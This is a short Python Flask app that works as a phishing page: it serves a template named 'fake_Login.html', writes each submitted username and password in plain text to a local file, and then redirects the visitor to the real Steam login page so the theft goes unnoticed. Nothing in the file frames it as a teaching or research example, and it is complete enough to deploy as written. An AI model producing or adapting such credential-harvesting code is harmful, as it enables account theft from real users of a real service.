from flask import Flask, render_template, request, redirect, url_for
import hashlib
import datetime

app = Flask(__name__)

def log_attempt(username, password):
    with open("login_attempts", "a") as file:
        file.write(f"[{datetime.datetime.now()}] Username: {username}, Password: {password}\n")

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form.get("username")
        password = request.form.get("password")
        log_attempt(username, password)
        return redirect("https://store.steampowered.com/login/")
    return render_template("fake_Login.html")

if __name__ == "__main__":
    app.run(debug=True)